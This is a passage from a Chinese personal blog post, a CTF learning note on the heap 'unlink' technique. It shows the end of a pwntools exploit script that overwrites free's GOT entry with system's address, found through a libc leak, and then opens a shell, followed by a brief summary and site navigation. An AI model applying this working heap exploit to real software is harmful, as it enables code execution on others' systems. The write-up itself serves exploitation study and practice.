data-num="75"></td><td><pre>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"free_got:%x"</span><span class="token punctuation">,</span>free_got<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>show<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>free_addr<span class="token operator">=</span>lic<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="84"></td><td><pre>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"free_addr:%x"</span><span class="token operator">%</span>free_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'free'</span><span class="token punctuation">,</span>free_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>libc_base<span class="token operator">=</span>free_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'free'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_addr:%x"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr:%x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#改写 got 表内容</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>it<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="/img/unlinkpic/image-20230811135415349.png" alt="image-20230811135415349"></p>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结：</h3>
+<p>unlink 这里比较的绕，其实不难，但是是去理解指针的指向需要花费一点时间，现在还是不太熟练，要继续加油。</p>
+
+      <div class="tags">
+          <a href="/tags/%E5%A0%86/" rel="tag"><i class="ic i-tag"></i> 堆</a>
+          <a href="/tags/unlink/" rel="tag"><i class="ic i-tag"></i> unlink</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-08-11 13:58:01" itemprop="dateModified" datetime="2023-08-11T13:58:01+08:00">2023-08-11</time>
+  </span>
+  <span id="2023/08/11/unlink/" class="item leancloud_visitors" data-flag-title="unlink" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>yhuanhuan <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/08/11/unlink/" title="unlink">http://example.com/2023/08/11/unlink/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/08/10/uaf/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;PeCrlT1WzSygfaB.png" title="uaf">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 技巧</span>
+  <h3>uaf</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/08/13/Nep-wp/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;8XHxYgIEC6JWoSP.png" title="Nep__wp">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Write_up</span>
+  <h3>Nep__wp</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn_unlink%E4%BA%86%E8%A7%A3%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text"> PWN_unlink 了解学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 题目来源：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BE%8B%E8%A1%8C%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.0.0.1.</span> <span class="toc-text"> 例行检查：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.1.0.0.2.</span> <span class="toc-text"> 执行程序：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ida%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.0.0.3.</span> <span class="toc-text"> IDA 看源代码：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exp%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.0.0.4.</span> <span class="toc-text"> exp 构造过程：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84exp"><span class="toc-number">1.1.1.0.0.5.</span> <span class="toc-text"> 最终的 exp：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 总结：</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/08/03/csu/" rel="bookmark" title="csu">csu</a></li><li><a href="/2023/08/03/srop/" rel="bookmark" title="srop">srop</a></li><li><a href="/2023/08/04/b-canary/" rel="bookmark" title="b_canary">b_canary</a></li><li><a href="/2023/08/10/uaf/" rel="bookmark" title="uaf">uaf</a></li><li class="active"><a href="/2023/08/11/unlink/" rel="bookmark" title="unlink">unlink</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="yhuanhuan"
+      data-src="/images/huanhuan.png">
+  <p class="name" itemprop="name">yhuanhuan</p>
+  <div class="description" itemprop="description">欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">11</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">7</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">13</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lodWFuaHVhbjAx" title="https:&#x2F;&#x2F;github.com&#x2F;yhuanhuan01"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/08/10/uaf/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/08/13/Nep-wp/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+</div>
+
+    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/09/10/sictf-wp/" title="sictf_wp">sictf_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/08/13/Nep-wp/" title="Nep__wp">Nep__wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/02/find-flag/" title="find_flag">find_flag</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E7%9F%A5%E8%AF%86/" title="分类于 知识">知识</a>
+</div>
+
+    <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yhuanhuan @ yhuanhuan</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">74k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:07</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/08/11/unlink/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"bottom","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
